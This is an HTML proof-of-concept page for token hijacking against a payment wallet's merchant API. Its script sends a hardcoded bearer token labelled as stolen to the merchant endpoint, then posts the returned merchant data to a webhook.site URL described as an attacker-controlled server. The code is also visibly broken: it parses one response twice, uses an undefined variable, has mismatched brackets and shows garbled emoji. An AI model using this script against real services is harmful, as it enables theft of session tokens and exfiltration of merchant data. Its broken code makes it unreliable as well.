<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Token Hijack to Exfil Merchant Data</title>
</head>
<body>
  <h1>PoC: Bearer Token Hijack</h1>
  <p>Open console for exfil test...</p>

  <script>
    console.log("üí° Script started");
    
    const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA"; // Replace with your test token

    fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
      method: "GET",
      headers: {
        "Authorization": stolenToken,
        "Accept": "application/json"
      }
    })
    .then(response => response.json())
    .then(response => {
  console.log("‚úÖ Request sent. Status:", response.status);
  return response.text(); // Instead of .json()
})
.then(raw => {
  console.log("‚ö†Ô∏è Can't access full JSON due to CORS. Raw body:", raw);
})

      // Exfiltrate to your controlled server (e.g., webhook.site or custom endpoint)
      fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ stolenMerchantData: data })
      });
    })
    .catch(err => console.error("‚ùå Exploit failed:", err));
  </script>
</body>
</html>
